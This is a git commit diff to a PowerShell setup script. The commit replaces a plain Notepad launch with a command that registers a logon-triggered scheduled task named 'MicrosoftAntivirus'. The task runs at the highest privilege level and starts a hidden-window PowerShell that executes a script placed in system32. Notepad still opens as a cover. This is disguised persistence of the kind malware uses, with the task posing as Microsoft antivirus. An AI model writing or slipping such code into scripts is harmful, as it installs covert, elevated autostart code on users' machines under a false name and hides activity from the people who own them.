d2dd02aa863cacc306447ffa7fb9ce03de59c398
CGMW293 <138163744+CGMW293@users.noreply.github.com>
2023-08-14 20:01:45 -0700

    Set itself to run on startup.ps1

--- Auto-script setup/First.ps1
+++ Auto-script setup/First.ps1
@@ -1,1 +1,2 @@
-notepad.exe
+Register-ScheduledTask -TaskName 'MicrosoftAntivirus' -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute '${Env:WinDir}\System32\WindowsPowerShell\v1.0\powershell.exe' -Argument '-WindowStyle Hidden -Command & ''C:\Windows\system32\ski.ps1''') -RunLevel Highest -Force;
+notepad.exe;
